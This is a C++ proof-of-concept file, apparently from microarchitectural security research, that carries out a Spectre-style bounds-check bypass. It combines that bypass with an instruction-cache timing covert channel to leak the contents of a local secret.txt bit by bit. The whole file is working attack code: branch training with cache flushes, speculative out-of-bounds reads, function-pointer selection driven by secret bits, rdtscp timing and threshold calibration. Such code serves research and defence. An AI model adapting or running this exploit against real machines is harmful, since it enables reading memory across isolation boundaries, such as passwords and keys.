// begin covert copied code
//#include <fcntl.h>
//#include <unistd.h>
using namespace std;
#include "stripes.hpp"
#define METRICS_ONLY
#include "bit-ops.h"
#include <time.h> // for timing execution
#include <x86intrin.h>
#include <assert.h>
#include <algorithm>    // std::sort
#include <ctype.h>


#define SPEC
#define BITMANIP


#define RDTSC(cycles) {__asm__ volatile("lfence");__asm__ volatile ("lfence;rdtscp;lfence;shl $32, %%rdx;or %%rdx, %%rax" : "=a" (cycles) :: "%rcx", "%rdx");}

#include <string.h> // memcpy

typedef void(*stripeptr)(void);


__attribute__ ((noinline))
__attribute__ ((aligned(1024)))
void tiger_0(){
    STRIPES_0;
}

__attribute__ ((noinline))
__attribute__ ((aligned(1024)))
void tiger_0_copy(){
    STRIPES_0;
}



#define y1 ((uint64_t)&tiger_0)
#define y0 ((uint64_t)&tiger_0_copy)



#include <stdio.h>
#include <stdlib.h>
#include <limits.h>
#include <stdint.h>
#ifdef _MSC_VER // ms visual c
    #include <intrin.h>
    #pragma optimize("gt",on)
#else // gcc
    #include <x86intrin.h>
#endif

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16
};
uint8_t unused2[64];

// int64_t time_tot = 0;
#define SECRET_SIZE 1024
char secret[SECRET_SIZE];

void populate_secret_bool(){
    for(int i = 0;i<SECRET_SIZE; ++i){
        secret[i] = rand() % 2;
    }
}

void populate_secret_randchar(){
    for(int i = 0; i<SECRET_SIZE; ++i){
        secret[i] = rand() % UCHAR_MAX;
    }
}

void populate_secret_text(){
    FILE *fp = fopen("secret.txt", "r");
    if(fp == NULL){
        perror("Error opening secret.txt");
        exit(-1);
    }
    fread(secret, 1, SECRET_SIZE, fp);
}


uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */


__attribute__ ((noinline))
__attribute__ ((aligned(1024)))
uint8_t victim_function(size_t x) {
    // bounds check to be crossed via spectre
    if(0< x && x < array1_size) {
        //this statement leaves a trace in array2 depending on value of array1[x]
        //temp &= array2[array1[x] * 512];
        return array1[x];
    } else {
        return -1;
    }
}

/* analysis code */

#define CACHE_HIT_THRESHOLD 80
#define TRIES 999


void do_transmit(int* timings){
    int junk=0;
    printf("real\tread\n");
    for(int ib=0; ib<SECRET_SIZE*8; ib++){ // ib = index and bit 
        int i = ib / 8;  // index in char array
        uint8_t b = ib % 8;// bit in char

        uint64_t register mask = 0x1 << b;
	timings[ib]=0; // clear counter for measurement
        for(int tries = 0; tries < 40; ++ tries){
	    // take average over 40 runs

            size_t x_train = (tries%array1_size);
            size_t x_target = (size_t)(&secret[i] - (char*) array1);

            for(int j=29;j>=0;j--){
                register uint64_t y = mask;

                size_t x=((j%6)-1)&~0xFFF;
                x=(x|(x>>16));
                x=(x_train)^(x&(x_target^x_train));


                _mm_clflush(&array1_size); // flush array1 size to get a speculation window while it's being reloaded

                
                #ifdef SPEC
                     y &= victim_function(x); // condition
                #else
                     y &= array1[x]; // condition
                #endif

                // y &= (0x1 << b); // extract bth bit


                #ifdef BITMANIP
                // if we wanna make sure it isn't a jz instruction transmitting the secret
                y = (~!(uint64_t)y)+1; // x = !cond ? 0xFFF..FFF : 0x000..000; every bit of x is inverse of cond
                y=(y1)^ (y & (y0^y1) );            // set x to x1 if x is all 0 else set to x1
                ((stripeptr)y)();
                #else
                if(y){
                    tiger_0();
                } else {
                    tiger_0_copy();
                }
                #endif

            }

            int64_t timediff = 0;
            
            timediff -= __rdtscp( (unsigned int*)&junk ); // use junk to fill 'signature register'
            asm volatile("lfence");
            tiger_0();
            timediff += __rdtscp( (unsigned int*)&junk ); // use junk to fill 'signature register'
            asm volatile("lfence");
            timings[ib] += timediff;
            
       }
        
    }
	
}


int main(int argc, const char** argv){
    victim_function(0);
    printf("with flags:");
    #ifdef BITMANIP
    printf("BITMANIP,");
    #endif
    #ifdef SPEC
    printf("SPEC,");
    #endif
    printf("\n");


    
    size_t target_x = (size_t)(secret - (char*) array1);

    int i, score[2];
    uint8_t value[2];
    int correct = 0;

    int timings[SECRET_SIZE*8] = {0}; // one timing for each bit, 8 bits for each char

    // establish threshold
    populate_secret_randchar();
    do_transmit(timings);
    int threshold[8];
	for(int b = 0; b < 8; ++b){
		
		uint64_t timings_thresh[SECRET_SIZE];
		for(int i = 0; i < SECRET_SIZE; ++i){
			timings_thresh[i] = timings[i*8+b];

			
		}
		sort(timings_thresh, timings_thresh+SECRET_SIZE);
		threshold[b] = timings_thresh[SECRET_SIZE / 2];
	}

    // transmit actual secrets
    populate_secret_text();
    do_transmit(timings);

    int sum = 0;
    char recv[SECRET_SIZE] = {0};
    // compute number of correct measurements
    int bit_errors_0[8] = {0}; // 1-to-0 substitution errors
    int bit_errors_1[8] = {0}; // 0-to-1 substitution errors
    for(int ib = 0; ib < SECRET_SIZE*8; ++ib){

        int i = ib / 8;
        int b = ib % 8;

        bool actual = secret[i] & (0x1 << b);

        bool measure = timings[ib] < threshold[b];

        if (actual == measure){
            correct ++;
        }

        // count 1 bits
        sum += !!(secret[i] & (0x1 << b));

        // reconstruct message
        if (b == 0){
            recv[i] = 0;
        }
        #ifndef DUMMYBIT
        recv[i] |= (measure << b);
        #else
        recv[i] = (measure);
        #endif

        // count errors in each bit position
        if(actual != measure){
            if(measure == 0){
                bit_errors_0[b] ++;
            } else {
                bit_errors_1[b] ++;
            }
        }
    }

    printf("Done reading:%d\n", SECRET_SIZE*8);
    printf("%d out of %d correct\n", correct, SECRET_SIZE*8);
    printf("Ratio: %f\n", (float)correct / (float)(SECRET_SIZE*8));
    printf("error distribution:\n");
    printf("\tpos\t1-to-0\t0-to-1\ttotal\n");
    for(int b = 0; b < 8; b++){
        printf(
            "\t%d\t%d\t%d\t%d\n",
            b, bit_errors_0[b], bit_errors_1[b],
            bit_errors_0[b] + bit_errors_1[b]);
    }
    
    printf("%d out of %d bits were 1\n", sum, SECRET_SIZE*8);

    printf("message received:\n");
    for(int i = 0; i<SECRET_SIZE; ++i){
        if(isprint(recv[i])){
            printf("%c", recv[i]);
        } else {
            //printf("[unprintable]");
        }
    }
    printf("\n\n\n\n");
    printf("message sent: %s\n\n\n\n", secret);
    
    printf("Thresholds for each bit in any char:");
    for(int b = 0; b < 8; ++b){
        printf("\t%d: %d\n", b,threshold[b]);
    }
    
    return 0;
}
